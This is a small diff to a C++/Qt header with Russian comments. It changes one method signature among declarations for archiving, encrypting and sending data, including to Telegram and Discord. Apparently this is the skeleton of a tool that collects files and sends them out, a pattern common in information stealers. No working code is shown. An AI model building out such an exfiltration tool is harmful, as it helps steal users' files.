@@ -181,7 +181,7 @@ private slots:
     void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
     void encryptData(const std::string& inputPath, const std::string& outputPath); // Шифрование данных
     void decryptData(const std::string& inputPath, const std::string& outputPath); // Дешифрование данных
-    void sendData(const std::string& filePath);    // Отправка данных
+    void sendData(const QString& encryptedData, const std::vector<std::string>& files); // Отправка данных
     void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
     void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord
     void saveToLocalFile(const std::string& filePath); // Сохранение данных в локальный файл
